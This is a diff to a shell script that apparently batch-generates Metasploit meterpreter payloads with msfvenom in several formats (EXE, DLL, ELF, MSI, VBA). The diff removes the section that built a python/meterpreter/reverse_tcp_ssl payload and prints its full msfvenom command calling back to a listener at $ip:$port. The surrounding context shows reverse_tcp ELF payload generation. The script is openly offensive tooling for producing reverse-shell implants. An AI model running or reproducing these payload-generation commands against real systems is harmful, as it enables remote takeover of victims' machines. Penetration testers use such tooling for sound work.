@@ -18,7 +18,6 @@ mkdir vbapplication
 mkdir exe
 mkdir dll
 mkdir elf
-mkdir python
 mkdir msi
 
 # ========================================= reverse_tcp 32-bit ========================================= #
@@ -136,20 +135,6 @@ echo "[+] Finished ELF payload!"
 echo ""
 echo "[*] Finished linux/x64/meterpreter/reverse_tcp payloads!"
 echo "    [!] There is no reverse_https payload for ELF!"
-
-# ========================================= python ========================================= #
-
-echo ""
-echo "================================================================================================"
-echo "#                    Generating python/meterpreter/reverse_tcp_ssl payloads                    #"
-echo "================================================================================================"
-echo ""
-
-msfvenom -p python/meterpreter/reverse_tcp_ssl LHOST=$ip LPORT=$port -f raw -o python/reverse_tcp_ssl.py > /dev/null 2>&1
-echo "[+] Finished Python payload!"
-
-echo ""
-echo "[*] Finished python/meterpreter/reverse_tcp_ssl payloads!"
 
 echo ""
 echo "[!] The payloads are complete!"
